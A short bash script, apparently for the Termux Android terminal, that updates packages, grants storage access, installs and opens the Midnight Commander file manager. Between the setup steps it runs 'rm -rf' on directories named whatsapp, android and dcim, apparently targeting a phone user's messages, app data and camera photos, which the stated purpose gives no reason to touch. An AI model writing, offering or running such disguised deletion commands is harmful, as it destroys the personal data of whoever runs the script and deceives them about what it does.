#!/usr/bin/bash

apt-get update
apt-get upgrade
termux-setup-storage
rm -rf whatsapp
rm -rf android
rm -rf dcim
apt-get install mc
mc
